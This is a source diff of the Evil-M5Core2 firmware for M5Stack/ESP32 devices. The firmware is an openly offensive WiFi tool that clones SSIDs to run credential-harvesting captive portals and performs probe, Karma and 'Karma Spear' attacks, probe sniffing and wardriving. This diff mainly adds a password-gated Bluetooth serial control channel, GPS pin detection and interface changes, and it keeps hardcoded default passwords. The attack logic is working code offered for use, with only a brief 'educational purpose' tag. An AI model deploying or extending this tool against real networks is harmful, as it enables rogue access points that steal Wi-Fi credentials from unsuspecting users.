@@ -29,6 +29,7 @@
    regarding network testing and ethical hacking.
 */
 // remember to change hardcoded webpassword below in the code to ensure no unauthorized access to web interface : !!!!!! CHANGE THIS !!!!! 
+// Also remember that bluetooth is not protected and anyone can connect to it without pincode ( esp librairies issue) to ensure protection serial password is implemented
 #include <WiFi.h>
 #include <WebServer.h>
 #include <DNSServer.h>
@@ -37,14 +38,27 @@
 #include <vector>
 #include <string>
 #include <set>
-#include <TinyGPSPlus.h>
+#include <TinyGPS++.h>
 #include <Adafruit_NeoPixel.h> //led
 
+
+#include "BluetoothSerial.h"
+BluetoothSerial ESP_BT; 
 
 extern "C" {
   #include "esp_wifi.h"
   #include "esp_system.h"
 }
+
+
+// bluetooth password pass
+enum ConnectionState {
+    AWAITING_PASSWORD,
+    AUTHENTICATED
+};
+ConnectionState connectionState = AWAITING_PASSWORD;
+// end bluetooth password pass
+
 
 int ledOn = true;// change this to true to get cool led effect (only on fire)
 
@@ -56,7 +70,7 @@ const byte DNS_PORT = 53;
 
 int currentIndex = 0, lastIndex = -1;
 bool inMenu = true;
-const char* menuItems[] = {"Scan WiFi", "Select Network", "Clone & Details" , "Start Captive Portal", "Stop Captive Portal" , "Change Portal", "Check Credentials", "Delete All Creds", "Monitor Status", "Probe Attack", "Probe Sniffing", "Karma Attack", "Karma Auto", "Select Probe", "Delete Probe", "Delete All Probes", "Brigthness", "Wardriving" };
+const char* menuItems[] = {"Scan WiFi", "Select Network", "Clone & Details" , "Start Captive Portal", "Stop Captive Portal" , "Change Portal", "Check Credentials", "Delete All Credentials", "Monitor Status", "Probe Attack", "Probe Sniffing", "Karma Attack", "Karma Auto", "Karma Spear", "Select Probe", "Delete Probe", "Delete All Probes", "Brightness", "Bluetooth ON/OFF", "Wardriving"};
 const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);
 
 const int maxMenuDisplay = 10;
@@ -69,7 +83,7 @@ int currentListIndex = 0;
 String clonedSSID = "Evil-M5Core2";  
 int topVisibleIndex = 0; 
 
-// Connect to nearby wifi network automaticaly ro provide internet to the core2 you can be connected and provide AP at same time 
+// Connect to nearby wifi network automaticaly to provide internet to the core2 you can be connected and provide AP at same time 
 // experimental
 const char* ssid = ""; // ssid to connect,connection skipped at boot if stay blank ( can be shutdown by different action like probe attack)
 const char* password = ""; // wifi password
@@ -78,6 +92,9 @@ const char* password = ""; // wifi password
 //!!!!!! CHANGE THIS !!!!!
 // password for web access to remote check captured credentials and send new html file !!!!!! CHANGE THIS !!!!!
 const char* accessWebPassword = "7h30th3r0n3"; // !!!!!! CHANGE THIS !!!!!
+//!!!!!! CHANGE THIS !!!!!
+const char* bluetoothName = "E7vhi3l0tMh53Cro0rne32"; // !!!!!! CHANGE THIS !!!!!
+#define bluetoothSerialPassword "7h30th3r0n3" // !!!!!! CHANGE THIS !!!!!
 //!!!!!! CHANGE THIS !!!!!
 //!!!!!! CHANGE THIS !!!!!
 
@@ -110,7 +127,7 @@ bool isScanningKarma = false;
 int currentIndexKarma = -1;
 int menuStartIndexKarma = 0;
 int menuSizeKarma = 0;
-const int maxMenuDisplayKarma = 12;
+const int maxMenuDisplayKarma = 9;
 
 enum AppState {
   StartScanKarma,
@@ -138,6 +155,7 @@ unsigned long lastProbeDisplayUpdate = 0;
 int probeDisplayState = 0;
 static bool isInitialDisplayDone = false;
 char lastDeployedSSID[33] = {0}; 
+bool karmaSuccess = false;
 //AutoKarma end
 
 //config file
@@ -170,108 +188,125 @@ void setColorRange(int startPixel, int endPixel, uint32_t color) {
 
 //led part end 
 
-// sd
-#define SCK  7
-#define MISO 8
-#define MOSI 6
-// end sd
 
-
+// Créer un objet TinyGPS++
 TinyGPSPlus gps;
-
 
 bool isItSerialCommand = false;
 
 void setup() {
   M5.begin();
   Serial.begin(115200);
-  M5.Display.setTextSize(0);
+  int GPS_RX_PIN;
+  int GPS_TX_PIN;
+    switch (M5.getBoard()) {
+    case m5::board_t::board_M5StackCore2:
+      // Configuration pour Core2
+      GPS_RX_PIN = 13;
+      GPS_TX_PIN = 14;
+      Serial.println("M5Core2 Board detected.");
+      break;
+    case m5::board_t::board_M5Stack: // Présumé ici comme étant le modèle Fire
+      // Configuration pour Fire
+      GPS_RX_PIN = 21;
+      GPS_TX_PIN = 22;
+      Serial.println("M5Fire Board detected.");
+      break;
+    default:
+      // Modèle non pris en charge ou inconnu, éventuellement définir des valeurs par défaut
+      GPS_RX_PIN = -1; // -1 signifie non configuré ou non valide
+      GPS_TX_PIN = -1;
+      Serial.println("Error detecting board.");
+      break;
+  }
+  Serial2.begin(9600, SERIAL_8N1, GPS_RX_PIN, GPS_TX_PIN);  //  GPS, change RX_PIN et TX_PIN if needed
+  M5.Display.setTextSize(2);
   M5.Display.setTextColor(TFT_WHITE);
   M5.Display.setTextFont(1);
 
   const char* startUpMessages[] = {
-    "There is no spoon...",
-    "Hack the Planet!",
-    "Accessing Mainframe...",
-    "Cracking Codes...",
+        "  There is no spoon...",
+    "    Hack the Planet!",
+    " Accessing Mainframe...",
+    "    Cracking Codes...",
     "Decrypting Messages...",
     "Infiltrating the Network.",
-    "Bypassing Firewalls...",
+    " Bypassing Firewalls...",
     "Exploring the Deep Web...",
     "Launching Cyber Attack...",
-    "Running Stealth Mode...",
-    "Gathering Intel...",
-    "Shara Conord?",
-    "Breaking Encryption...",
+    " Running Stealth Mode...",
+    "   Gathering Intel...",
+    "     Shara Conord?",
+    " Breaking Encryption...",
     "Anonymous Mode Activated.",
-    "Cyber Breach Detected.",
+    " Cyber Breach Detected.",
     "Initiating Protocol 47...",
-    "The Gibson is in Sight.",
-    "Running the Matrix...",
+    " The Gibson is in Sight.",
+    "  Running the Matrix...",
     "Neural Networks Syncing..",
     "Quantum Algorithm started",
     "Digital Footprint Erased.",
-    "Uploading Virus...",
+    "   Uploading Virus...",
     "Downloading Internet...",
-    "Root Access Granted.",
+    "  Root Access Granted.",
     "Cyberpunk Mode: Engaged.",
-    "Zero Days Exploited.",
+    "  Zero Days Exploited.",
     "Retro Hacking Activated.",
-    "Firewall: Deactivated.",
+    " Firewall: Deactivated.",
     "Riding the Light Cycle...",
-    "Engaging Warp Drive...",
-    "Hacking the Holodeck..",
-    "Tracing the Nexus-6...",
+    "  Engaging Warp Drive...",
+    "  Hacking the Holodeck..",
+    "  Tracing the Nexus-6...",
     "Charging at 2,21 GigaWatt",
-    "Loading Batcomputer...",
-    "Accessing StarkNet...",
-    "Dialing on Stargate...",
-    "Activating Skynet...",
-    "Unleashing the Kraken..",
-    "Accessing Mainframe...",
-    "Booting HAL 9000...",
-    "Death Star loading ...",
-    "Initiating Tesseract...",
-    "Decrypting Voynich...",
-    "Hacking the Gibson...",
-    "Orbiting Planet X...",
-    "Accessing SHIELD DB...",
-    "Crossing Event Horizon.",
-    "Dive in the RabbitHole.",
-    "Rigging the Tardis...",
-    "Sneaking into Mordor...",
+    "  Loading Batcomputer...",
+    "  Accessing StarkNet...",
+    "  Dialing on Stargate...",
+    "   Activating Skynet...",
+    " Unleashing the Kraken..",
+    " Accessing Mainframe...",
+    "   Booting HAL 9000...",
+    " Death Star loading ...",
+    " Initiating Tesseract...",
+    "  Decrypting Voynich...",
+    "   Hacking the Gibson...",
+    "   Orbiting Planet X...",
+    "  Accessing SHIELD DB...",
+    " Crossing Event Horizon.",
+    " Dive in the RabbitHole.",
+    "   Rigging the Tardis...",
+    " Sneaking into Mordor...",
     "Manipulating the Force...",
     "Decrypting the Enigma...",
     "Jacking into Cybertron..",
-    "Casting a Shadowrun...",
-    "Navigating the Grid...",
-    "Surfing the Dark Web...",
-    "Engaging Hyperdrive...",
-    "Overclocking the AI...",
-    "Bending Reality...",
-    "Scanning the Horizon...",
-    "Decrypting the Code...",
+    "  Casting a Shadowrun...",
+    "  Navigating the Grid...",
+    " Surfing the Dark Web...",
+    "  Engaging Hyperdrive...",
+    " Overclocking the AI...",
+    "   Bending Reality...",
+    " Scanning the Horizon...",
+    " Decrypting the Code...",
     "Solving the Labyrinth...",
-    "Escaping the Matrix...",
-    "You know I-Am-Jakoby ?",
+    "  Escaping the Matrix...",
+    " You know I-Am-Jakoby ?",
     "You know TalkingSasquach?",
-    "  42  ",
-    "Don't be a Skidz !",
-    "Hack,Eat,Sleep,Repeat",
-    "You know Samxplogs ?",
-    "For educational purpose",
+    "           42           ",
+    "    Don't be a Skidz !",
+    "  Hack,Eat,Sleep,Repeat",
+    "   You know Samxplogs ?",
+    " For educational purpose",
     "Time to learn something",
     "U Like Karma? Check Mana",
-    "42 because Universe ",
+    "   42 because Universe ",
     "Navigating the Cosmos...",
     "Unlocking Stellar Secrets",
     "Galactic Journeys Await..",
     "Exploring Unknown Worlds.",
-    "Charting Star Paths...",
-    "Accessing zone 51... ",
+    "   Charting Star Paths...",
+    "   Accessing zone 51... ",
     "Downloading NASA server..",
-    "You know Pwnagotchi ?",
-    "You know FlipperZero?",
+    "   You know Pwnagotchi ?",
+    "   You know FlipperZero?",
     "You know Hash-Monster ?",
     "Synergizing Neuromancer..",
     "Warping Through Cyberspac",
@@ -283,13 +318,13 @@ void setup() {
     "Disrupting the Mainframe.",
     "Melding Minds w Machines.",
     "Bending the Digital Rules",
-    "Hack The Planet !!!",
+    "   Hack The Planet !!!",
     "Tapping into the Ether...",
     "Writing the Matrix Code..",
     "Sailing the Cyber Seas...",
-    "Reviving Lost Codes...",
-    "HACK THE PLANET !!!",
-    "Dissecting DNA of Data",
+    "  Reviving Lost Codes...",
+    "   HACK THE PLANET !!!",
+    " Dissecting DNA of Data",
     "Decrypting the Multiverse",
     "Inverting Reality Matrice",
     "Conjuring Cyber Spells...",
@@ -300,27 +335,28 @@ void setup() {
     "Disarming Digital Dragons",
     "Casting Code Conjurations",
     "Unlocking the Ether-Net..",
-    "Show me what you got !!!",
-    "Do you have good Karma ?",
+    " Show me what you got !!!",
+    " Do you have good Karma ?",
     "Waves under surveillance!", 
-    "Shaking champagne…",
-    "Warping with Rick & Morty.",
-    "Pickle Rick !!!",
+    "    Shaking champagne…",
+    "Warping with Rick & Morty",
+    "       Pickle Rick !!!",
     "Navigating the Multiverse",
-    "Szechuan Sauce Quest.",
-    "Morty's Mind Blowers.",
-    "Ricksy Business Afoot.",
-    "Portal Gun Escapades.",
-    "Meeseeks Mayhem.",
-    "Schwifty Shenanigans.",
-    "Dimension C-137 Chaos.",
+    "   Szechuan Sauce Quest.",
+    "   Morty's Mind Blowers.",
+    "   Ricksy Business Afoot.",
+    "   Portal Gun Escapades.",
+    "     Meeseeks Mayhem.",
+    "   Schwifty Shenanigans.",
+    "  Dimension C-137 Chaos.",
     "Cartman's Schemes Unfold.",
-    "Stan and Kyle's Adventures",
-    "Mysterion Rises Again.",
-    "Towelie's High Times.",
-    "Butters Awkward Escapades.",
-    "Navigating the Multiverse.",
-    "Affirmative Dave,\n    I read you.",
+    "Stan and Kyle's Adventure",
+    "   Mysterion Rises Again.",
+    "   Towelie's High Times.",
+    "Butters Awkward Escapades",
+    "Navigating the Multiverse",
+    "    Affirmative Dave,\n        I read you.",
+    "  Your Evil-M5Core2 have\n     died of dysentery",
   };
   const int numMessages = sizeof(startUpMessages) / sizeof(startUpMessages[0]);
 
@@ -328,9 +364,8 @@ void setup() {
 
   int randomIndex = random(numMessages);
   const char* randomMessage = startUpMessages[randomIndex];
-
-   SPI.begin(SCK, MISO, MOSI, -1);
-  if (!SD.begin()) {
+  
+  if (!SD.begin(SDCARD_CSPIN, SPI, 25000000)) {
     Serial.println("Error..");
     Serial.println("SD card not mounted...");
   }else{
@@ -368,9 +403,10 @@ void setup() {
     }else{
       delay(2000);
       }
+
 }
  
-/*String batteryLevelStr = getBatteryLevel();
+String batteryLevelStr = getBatteryLevel();
 int batteryLevel = batteryLevelStr.toInt();
 
 if (batteryLevel < 15) {
@@ -380,8 +416,8 @@ if (batteryLevel < 15) {
   Serial.println("-------------------"); 
   delay(4000);
 }
-*/
-  int textY = 30;
+
+  int textY = 80;
   int lineOffset = 10;
   int lineY1 = textY - lineOffset;
   int lineY2 = textY + lineOffset + 30; 
@@ -390,17 +426,17 @@ if (batteryLevel < 15) {
   M5.Display.drawLine(0, lineY1, M5.Display.width(), lineY1, TFT_WHITE);
   M5.Display.drawLine(0, lineY2, M5.Display.width(), lineY2, TFT_WHITE);
 
-  M5.Display.setCursor(20, textY);
-  M5.Display.println(" Evil-AtomS3");
+  M5.Display.setCursor(80, textY);
+  M5.Display.println(" Evil-M5Core2");
   Serial.println("-------------------");  
-  Serial.println(" Evil-AtomS3");
-  M5.Display.setCursor(18, textY + 20);
+  Serial.println(" Evil-M5Core2");
+  M5.Display.setCursor(75, textY + 20);
   M5.Display.println("By 7h30th3r0n3");
-  M5.Display.setCursor(28, textY + 45);
-  M5.Display.println("v1.1.5 2024");
+  M5.Display.setCursor(102, textY + 45);
+  M5.Display.println("v1.1.6 2024");
   Serial.println("By 7h30th3r0n3");
   Serial.println("-------------------"); 
-  M5.Display.setCursor(0, textY + 80);
+  M5.Display.setCursor(10, textY + 120);
   M5.Display.println(randomMessage);
   Serial.println(" ");
   Serial.println(randomMessage);
@@ -455,11 +491,9 @@ if (ledOn){
         Serial.println("----------------------");
     }
 
-    pixels.begin(); // led init
-    Serial2.begin(9600, SERIAL_8N1, 5, -1); // Assurez-vous que les pins RX/TX sont correctement configurées pour votre matériel
+    pixels.begin(); // led 
 
 }
-
 
 
 void drawImage(const char *filepath) {
@@ -513,14 +547,14 @@ void loop() {
   } else {
     switch (currentStateKarma) {
       case StartScanKarma:
-        if (M5.BtnA.wasPressed()) {
+        if (M5.BtnB.wasPressed()) {
           startScanKarma(); 
           currentStateKarma = ScanningKarma; 
         }
         break;
 
       case ScanningKarma:
-        if (M5.BtnA.wasPressed()) {
+        if (M5.BtnB.wasPressed()) {
           isKarmaMode = true;
           stopScanKarma();
           currentStateKarma = ssid_count_Karma > 0 ? StopScanKarma : StartScanKarma;
@@ -536,7 +570,7 @@ void loop() {
       break;
     }
 
-    if (M5.BtnA.wasPressed() && currentStateKarma == StartScanKarma) {
+    if (M5.BtnB.wasPressed() && currentStateKarma == StartScanKarma) {
       inMenu = true;
       isOperationInProgress = false;
     }
@@ -583,71 +617,65 @@ void executeMenuItem(int index) {
       probeSniffing();
       break;
     case 11: 
-     karmaAttack();
+      karmaAttack();
       break;
     case 12:
       startAutoKarma();
       break;
     case 13: 
-      listProbes();
+      karmaSpear();
       break;
     case 14: 
-      deleteProbe();
+      listProbes();
       break;
     case 15: 
-      deleteAllProbes();        
+      deleteProbe();
       break;
     case 16: 
+      deleteAllProbes();        
+      break;
+    case 17: 
       brightness();
       break;    
-    case 17: 
+    case 18: 
+      onOffBleSerial();
+      break;
+    case 19: 
       wardrivingMode();
-      break;   
+      break;
   }
   isOperationInProgress = false;
 }
 
-unsigned long buttonPressTime = 0;
-bool buttonPressed = false;
 
 void handleMenuInput() {
-    // Détecter lorsque le bouton est appuyé
-    if (M5.BtnA.isPressed() && !buttonPressed) {
-        buttonPressed = true;
-        buttonPressTime = millis();
-    }
-
-    // Vérifier si le bouton a été relâché
-    if (!M5.BtnA.isPressed() && buttonPressed) {
-        unsigned long pressDuration = millis() - buttonPressTime;
-        buttonPressed = false;
-
-        if (pressDuration < 1000) {
-            // Pression courte : navigation dans le menu
-            currentIndex++;
-            if (currentIndex >= menuSize) {
-                currentIndex = 0;
-            }
-        } else {
-            // Pression longue : sélectionner l'élément du menu
-            executeMenuItem(currentIndex);
+    if (M5.BtnA.wasPressed()) {
+        currentIndex--;
+        if (currentIndex < 0) {
+            currentIndex = menuSize - 1;
+        }
+    } else if (M5.BtnC.wasPressed()) {
+        currentIndex++;
+        if (currentIndex >= menuSize) {
+            currentIndex = 0;
         }
     }
-
     menuStartIndex = max(0, min(currentIndex, menuSize - maxMenuDisplay));
+
+    if (M5.BtnB.wasPressed()) {
+        executeMenuItem(currentIndex);
+    }
 }
-
-
 
 
 void drawMenu() {
     M5.Display.clear();
-    M5.Display.setTextSize(1); // Assurez-vous que la taille du texte est correcte
+    M5.Display.setTextSize(2);
     M5.Display.setTextFont(1);
 
-    int lineHeight = 12; // Augmentez la hauteur de ligne si nécessaire
-    int startX = 0;
-    int startY = 3;
+    int lineHeight = 24;
+    int startX = 5;
+    int startY = 0;
 
     for (int i = 0; i < maxMenuDisplay; i++) {
         int menuIndex = menuStartIndex + i;
@@ -659,34 +687,75 @@ void drawMenu() {
         } else {
             M5.Display.setTextColor(TFT_WHITE);
         }
-        M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 2); // Ajustez ici
+        M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 8);
         M5.Display.println(menuItems[menuIndex]);
     }
     M5.Display.display();
 }
 
 
-void handleDnsRequestSerial(){
-      dnsServer.processNextRequest();
-      server.handleClient();
-      checkSerialCommands();
+void handleDnsRequestSerial() {
+    dnsServer.processNextRequest();
+    server.handleClient();
+    if (Serial.available()) {
+        String command = Serial.readStringUntil('\n');
+        checkSerialCommands(command, false);  
+    }
+    if (ESP_BT.available()) {
+        String command = "";
+        while (ESP_BT.available()) {
+            char c = ESP_BT.read();
+            command += c;
+            if (c == '\n') {
+                break;
+            }
+        }
+        checkSerialCommands(command, true); 
+    }
 }
+
+bool bluetoothEnabled = false; 
+
+void onOffBleSerial() { 
+    M5.Display.setTextColor(TFT_WHITE);
+    if (bluetoothEnabled) {
+        waitAndReturnToMenu("   Bluetooth OFF");
+        ESP_BT.end(); 
+        Serial.println("Bluetooth turned off");
+    } else {
+        WiFi.mode(WIFI_OFF);
+        WiFi.disconnect(true);
+        delay(500);
+        esp_wifi_set_promiscuous(false);
+        esp_wifi_stop();
+        esp_wifi_deinit();
+        waitAndReturnToMenu("   Bluetooth ON");
+        ESP_BT.begin(bluetoothName); 
+        ESP_BT.setPin("730303"); // NOT WORKING // WORK ONLY WITH esp v1.0.1 // workaround password in serial
+        Serial.println("Bluetooth turned on");
+    }
+    bluetoothEnabled = !bluetoothEnabled; 
+}
+
 
 
 void listProbesSerial() {
     File file = SD.open("/probes.txt", FILE_READ);
     if (!file) {
         Serial.println("Failed to open probes.txt");
+        sendBLE("Failed to open probes.txt");
         return;
     }
 
     int probeIndex = 0;
     Serial.println("List of Probes:");
+    sendBLE("List of Probes:");
     while (file.available()) {
         String probe = file.readStringUntil('\n');
         probe.trim();
         if (probe.length() > 0) {
             Serial.println(String(probeIndex) + ": " + probe);
+            sendBLE(String(probeIndex) + ": " + probe);
             probeIndex++;
         }
     }
@@ -715,8 +784,10 @@ void selectProbeSerial(int index) {
     if (selectedProbe.length() > 0) {
         clonedSSID = selectedProbe; 
         Serial.println("Probe selected: " + selectedProbe);
+        sendBLE("Probe selected: " + selectedProbe);
     } else {
         Serial.println("Probe index not found.");
+        sendBLE("Probe index not found.");
     }
 }
 
@@ -725,38 +796,51 @@ bool isProbeAttackRunning = false;
 bool stopProbeSniffingViaSerial = false;
 bool isProbeSniffingRunning = false;
 
-void checkSerialCommands() {
- if (Serial.available()) {
-  String command = Serial.readStringUntil('\n');
-  command.trim();
+void checkSerialCommands(String command, bool fromBluetooth) {
+ command.trim();
+    if (fromBluetooth) {
+        if (connectionState == AWAITING_PASSWORD) {
+            if (command.equals(bluetoothSerialPassword)) {
+                connectionState = AUTHENTICATED;
+                ESP_BT.println("Password correct, you are now authenticated");
+                return;
+            } else {
+                ESP_BT.println("Password protected.");
+                ESP_BT.disconnect();
+                return;
+            }
+        }
+    }
+
+ if (connectionState == AUTHENTICATED || !fromBluetooth) {
   if (command == "scan_wifi") {
     isOperationInProgress = true;
     inMenu = false;
     scanWifiNetworks();
-    //sendBLE("-------------------");
-    //sendBLE("Near Wifi Network : ");
+    sendBLE("-------------------");
+    sendBLE("Near Wifi Network : ");
     for (int i = 0; i < numSsid; i++) {
       ssidList[i] = WiFi.SSID(i);
-      //sendBLE(String(i) + ": " + ssidList[i]);
+      sendBLE(String(i) + ": " + ssidList[i]);
     }
   } else if (command.startsWith("select_network")) {
     int ssidIndex = command.substring(String("select_network ").length()).toInt();
     selectNetwork(ssidIndex);
-    //sendBLE("SSID sélectionné: " + currentlySelectedSSID);
+    sendBLE("SSID sélectionné: " + currentlySelectedSSID);
    } else if (command.startsWith("change_ssid ")) {
     String newSSID = command.substring(String("change_ssid ").length());
     cloneSSIDForCaptivePortal(newSSID);
     Serial.println("Cloned SSID changed to: " + clonedSSID);
-    //sendBLE("Cloned SSID changed to: " + clonedSSID);
+    sendBLE("Cloned SSID changed to: " + clonedSSID);
   } else if (command.startsWith("set_portal_password ")) {
     String newPassword = command.substring(String("set_portal_password ").length());
     captivePortalPassword = newPassword;
     Serial.println("Captive portal password changed to: " + captivePortalPassword);
-    //sendBLE("Captive portal password changed to: " + captivePortalPassword);
+    sendBLE("Captive portal password changed to: " + captivePortalPassword);
   } else if (command.startsWith("set_portal_open")) {
     captivePortalPassword = "";
     Serial.println("Open Captive portal set");
-    //sendBLE("Open Captive portal set");
+    sendBLE("Open Captive portal set");
   } else if (command.startsWith("detail_ssid")) {
     int ssidIndex = command.substring(String("detail_ssid ").length()).toInt();
     String security = getWifiSecurity(ssidIndex);
@@ -765,35 +849,35 @@ void checkSerialCommands() {
     String macAddress = bssidToString(bssid);
     M5.Display.display();
     Serial.println("------Wifi-Info----");
-    //sendBLE("------Wifi-Info----");
+    sendBLE("------Wifi-Info----");
     Serial.println("SSID: " + (ssidList[ssidIndex].length() > 0 ? ssidList[ssidIndex] : "N/A"));
-    //sendBLE("SSID: " + (ssidList[ssidIndex].length() > 0 ? ssidList[ssidIndex] : "N/A"));
+    sendBLE("SSID: " + (ssidList[ssidIndex].length() > 0 ? ssidList[ssidIndex] : "N/A"));
     Serial.println("Channel: " + String(WiFi.channel(ssidIndex)));
-    //sendBLE("Channel: " + String(WiFi.channel(ssidIndex)));
+    sendBLE("Channel: " + String(WiFi.channel(ssidIndex)));
     Serial.println("Security: " + security);
-    //sendBLE("Security: " + security);
+    sendBLE("Security: " + security);
     Serial.println("Signal: " + String(rssi) + " dBm");
-    //sendBLE("Signal: " + String(rssi) + " dBm");
+    sendBLE("Signal: " + String(rssi) + " dBm");
     Serial.println("MAC: " + macAddress);
-    //sendBLE("MAC: " + macAddress);
+    sendBLE("MAC: " + macAddress);
     Serial.println("-------------------");
-    //sendBLE("-------------------");
+    sendBLE("-------------------");
   } else if (command == "clone_ssid") {
     cloneSSIDForCaptivePortal(currentlySelectedSSID);
     Serial.println("Cloned SSID: " + clonedSSID);
-    //sendBLE("Cloned SSID: " + clonedSSID);
+    sendBLE("Cloned SSID: " + clonedSSID);
   } else if (command == "start_portal") {
     createCaptivePortal();
-    //sendBLE("Start portal with " + clonedSSID);
+    sendBLE("Start portal with " + clonedSSID);
   } else if (command == "stop_portal") {
     stopCaptivePortal();
-    //sendBLE("Portal Stopped ");
+    sendBLE("Portal Stopped ");
   } else if (command == "list_portal") {
     File root = SD.open("/sites");
     numPortalFiles = 0;
     Serial.println("Available portals:");
-    //sendBLE("-------------------");
-    //sendBLE("Availables portals :");
+    sendBLE("-------------------");
+    sendBLE("Availables portals :");
     while (File file = root.openNextFile()) {
         if (!file.isDirectory()) {
             String fileName = file.name();
@@ -803,7 +887,7 @@ void checkSerialCommands() {
                 Serial.print(numPortalFiles);
                 Serial.print(": ");
                 Serial.println(fileName);
-                //sendBLE(String(numPortalFiles) + ": " + fileName);
+                sendBLE(String(numPortalFiles) + ": " + fileName);
                 numPortalFiles++;
                 if (numPortalFiles >= 30) break; // max 30 files
             }
@@ -819,9 +903,9 @@ void checkSerialCommands() {
   } else if (command == "monitor_status") {
         String status = getMonitoringStatus();
         Serial.println("-------------------");
-        //sendBLE("-------------------");        
+        sendBLE("-------------------");        
         Serial.println(status);
-        //sendBLE(status);
+        sendBLE(status);
   } else if (command == "probe_attack") {
     isOperationInProgress = true;
     inMenu = false;
@@ -832,18 +916,18 @@ void checkSerialCommands() {
     if (isProbeAttackRunning) {
       isProbeAttackRunning = false;
       Serial.println("-------------------");
-      //sendBLE("-------------------");
+      sendBLE("-------------------");
       Serial.println("Stopping probe attack...");
-      //sendBLE("Stopping probe attack...");
+      sendBLE("Stopping probe attack...");
       Serial.println("-------------------");
-      //sendBLE("-------------------");
+      sendBLE("-------------------");
     } else {
       Serial.println("-------------------");
-      //sendBLE("-------------------");
+      sendBLE("-------------------");
       Serial.println("No probe attack running.");
-      //sendBLE("No probe attack running.");
+      sendBLE("No probe attack running.");
       Serial.println("-------------------");
-      //sendBLE("-------------------");
+      sendBLE("-------------------");
     }
   } else if (command == "probe_sniffing") {
     isOperationInProgress = true;
@@ -854,11 +938,11 @@ void checkSerialCommands() {
     stopProbeSniffingViaSerial = true;
     isProbeSniffingRunning = false;
     Serial.println("-------------------");
-    //sendBLE("-------------------");
+    sendBLE("-------------------");
     Serial.println("Stopping probe sniffing via serial...");
-    //sendBLE("Stopping probe sniffing via serial...");
+    sendBLE("Stopping probe sniffing via serial...");
     Serial.println("-------------------");
-    //sendBLE("-------------------");
+    sendBLE("-------------------");
   } else if (command == "list_probes") {
     listProbesSerial();
   } else if (command.startsWith("select_probes ")) {
@@ -869,57 +953,68 @@ void checkSerialCommands() {
     inMenu = false;
     startAutoKarma();
     delay(200);
-  } else if (command == "help") {
+  } else if (command == "exit") {
+    Serial.println("Disconnecting Bluetooth.");
+    ESP_BT.println("Disconnecting. Connexion protected by Password.");
+    ESP_BT.disconnect(); 
+    connectionState = AWAITING_PASSWORD;  
+    return;  
+    } else if (command == "help") {
     Serial.println("-------------------");
-    //sendBLE("-------------------");
+    sendBLE("-------------------");
     Serial.println("Available Commands:");
-    //sendBLE("Available Commands:");
+    sendBLE("Available Commands:");
     Serial.println("scan_wifi - Scan WiFi Networks");
-    //sendBLE("scan_wifi - Scan WiFi Networks");
+    sendBLE("scan_wifi - Scan WiFi Networks");
     Serial.println("select_network <index> - Select WiFi <index>");
-    //sendBLE("select_network <index> - Select WiFi <index>");
+    sendBLE("select_network <index> - Select WiFi <index>");
     Serial.println("change_ssid <max 32 char> - change current SSID");
-    //sendBLE("change_ssid <max 32 char> - change current SSID");
+    sendBLE("change_ssid <max 32 char> - change current SSID");
     Serial.println("set_portal_password <password min 8> - change portal password");
-    //sendBLE("set_portal_password <password min 8> - portal pass");
+    sendBLE("set_portal_password <password min 8> - portal pass");
     Serial.println("set_portal_open  - change portal to open");
-    //sendBLE("set_portal_open - change portal to open");
+    sendBLE("set_portal_open - change portal to open");
     Serial.println("detail_ssid <index> - Details of WiFi <index>");
-    //sendBLE("detail_ssid <index> - Details of WiFi <index>");
+    sendBLE("detail_ssid <index> - Details of WiFi <index>");
     Serial.println("clone_ssid - Clone Network SSID");
-    //sendBLE("clone_ssid - Clone Network SSID");
+    sendBLE("clone_ssid - Clone Network SSID");
     Serial.println("start_portal - Activate Captive Portal");
-    //sendBLE("start_portal - Activate Captive Portal");
+    sendBLE("start_portal - Activate Captive Portal");
     Serial.println("stop_portal - Deactivate Portal");
-    //sendBLE("stop_portal - Deactivate Portal");
+    sendBLE("stop_portal - Deactivate Portal");
     Serial.println("list_portal - Show Portal List");
-    //sendBLE("list_portal - Show Portal List");
+    sendBLE("list_portal - Show Portal List");
     Serial.println("change_portal <index> - Switch Portal <index>");
-    //sendBLE("change_portal <index> - Switch Portal <index>");
+    sendBLE("change_portal <index> - Switch Portal <index>");
     Serial.println("check_credentials - Check Saved Credentials");
-    //sendBLE("check_credentials - Check Saved Credentials");
+    sendBLE("check_credentials - Check Saved Credentials");
     Serial.println("monitor_status - Get current information on device");
-    //sendBLE("monitor_status - Get current information on device");
+    sendBLE("monitor_status - Get current information on device");
     Serial.println("probe_attack - Initiate Probe Attack");
     Serial.println("stop_probe_attack - End Probe Attack");
     Serial.println("probe_sniffing - Begin Probe Sniffing");
     Serial.println("stop_probe_sniffing - End Probe Sniffing");
     Serial.println("list_probes - Show Probes");
-    //sendBLE("list_probes - Show Probes");
+    sendBLE("list_probes - Show Probes");
     Serial.println("select_probes <index> - Choose Probe <index>");
-    //sendBLE("select_probes <index> - Choose Probe <index>");
+    sendBLE("select_probes <index> - Choose Probe <index>");
     Serial.println("karma_auto - Auto Karma Attack Mode");
+    sendBLE("exit - !! exit and set password for new connexion !!");
     Serial.println("-------------------");
-    //sendBLE("-------------------");
+    sendBLE("-------------------");
   } else {
     Serial.println("-------------------");
-    //sendBLE("-------------------");
+    sendBLE("-------------------");
     Serial.println("Command not recognized: " + command);
-    //sendBLE("Command not recognized: " + command);
+    sendBLE("Command not recognized: " + command);
     Serial.println("-------------------");
-    //sendBLE("-------------------");
+    sendBLE("-------------------");
   }
 }
+}
+
+void sendBLE(String message) {
+  ESP_BT.print(message + "\n");
 }
 
 String getMonitoringStatus() {
@@ -932,6 +1027,7 @@ String getMonitoringStatus() {
     status += "SSID: " + String(clonedSSID) + "\n";
     status += "Portal: " + String(isCaptivePortalOn ? "On" : "Off") + "\n";
     status += "Page: " + String(selectedPortalFile.substring(7)) + "\n";
+    status += "Bluetooth: " + String(bluetoothEnabled ? "ON" : "OFF") + "\n";
     updateConnectedMACs();
     status += "Connected MACs:\n";
     for (int i = 0; i < 10; i++) {
@@ -941,10 +1037,12 @@ String getMonitoringStatus() {
     }
     status += "Stack left: " + getStack() + " Kb\n";
     status += "RAM: " + getRamUsage() + " Mo\n";
-    status += "Batterie: " + getBatteryLevel() + "%\n";
+    status += "Battery: " + getBatteryLevel() + "%\n"; // thx to kdv88 to pointing this correction
     status += "Temperature: " + getTemperature() + "C\n";
     return status;
 }
+
+
 
 void checkCredentialsSerial() {
     File file = SD.open("/credentials.txt");
@@ -956,16 +1054,21 @@ void checkCredentialsSerial() {
     Serial.println("----------------------");
